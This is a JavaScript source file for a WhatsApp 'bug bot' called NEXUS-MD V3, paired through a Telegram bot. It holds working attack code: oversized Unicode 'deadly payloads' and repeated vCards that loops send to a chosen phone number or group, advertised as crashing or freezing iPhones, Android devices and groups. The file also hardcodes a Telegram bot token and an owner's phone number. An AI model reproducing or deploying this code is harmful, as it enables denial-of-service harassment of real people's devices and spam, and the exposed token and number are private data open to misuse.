const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD V3 ELITE",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false 
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        // --- 🛠️ LINK NOTIFICATION FIX ---
        browser: ["Ubuntu", "Chrome", "20.0.04"], 
        printQRInTerminal: false,
        mobile: false,
        syncFullHistory: false
    });

    // --- 🤖 TELEGRAM PAIRING (LINK NOTIFICATION FIXED) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        const chatId = msg.chat.id;

        if (text === '/start') {
            return tgBot.sendMessage(chatId, "☠️ *NEXUS-MD V3 BUG SYSTEM*\n\nPairing Code එක ලබා ගැනීමට WhatsApp අංකය එවන්න.\n*(Ex: 94767475809)*", { parse_mode: 'Markdown' });
        }

        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(chatId, "⏳ *සකසමින් පවතී... කරුණාකර ඔබගේ WhatsApp Notification බලන්න.*");
                
                // Pairing request එක යවන කොටස
                setTimeout(async () => {
                    let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                    tgBot.sendMessage(chatId, `🔥 *YOUR CODE:* \`${code}\``, { parse_mode: 'Markdown' });
                }, 3000);

            } catch (e) {
                tgBot.sendMessage(chatId, "❌ *Error!* Restart Bot and Try Again.");
            }
        }
    });

    // --- 📩 WHATSAPP BUG HANDLER (9 MODES) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
            
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const text = body.trim().split(/ +/).slice(1).join(" ");
            const target = text + "@s.whatsapp.net";

            // --- 🦠 DEADLY PAYLOADS ---
            const bug1 = "☠️" + "ꦿ".repeat(45000); 
            const bug2 = "🔥" + "᥋".repeat(50000); 
            const bug3 = "❄️" + "꠵".repeat(55000); 

            switch (command) {
                case 'menu':
                case 'bug':
                    const menu = `╭───〔 *NEXUS-MD V3* 〕───┈
│
│ 🦠 *ELITE BUG SYSTEM (9 MODES)*
│
├ ☠️ *1. .ios1* - iPhone Hard Lag
├ 🔥 *2. .ios2* - iPhone UI Freeze
├ 💀 *3. .kill* - Android Destroyer
├ ❄️ *4. .freeze* - System Lag
├ 📍 *5. .loc* - Location Bug
├ 📇 *6. .vcard* - Contact Crash
├ 🌀 *7. .group* - Group Destroyer
├ 🧨 *8. .bomb* - Spam Bug
├ 🌌 *9. .the_end* - Total Crash
│
╰─────────────┈
 👑 *DEV:* SASIYA MD`;

                    await sock.sendMessage(from, { text: menu }, { quoted: mek });
                    break;

                case 'ios1':
                case 'the_end':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🌑 *DEPLOYING KILLER BUG...*" });
                    for(let i=0; i<12; i++) {
                        await sock.sendMessage(target, { text: bug1 + bug2 + bug3 });
                        await delay(400);
                    }
                    await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED!*" });
                    break;

                case 'vcard':
                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nEND:VCARD'.repeat(250);
                    await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                    break;

                case 'group':
                    if (!text) return;
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(text, { text: bug1 + bug2 + bug3 });
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'close') startNexus();
        else if (up.connection === 'open') console.log('✅ ELITE BUG BOT READY!');
    });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
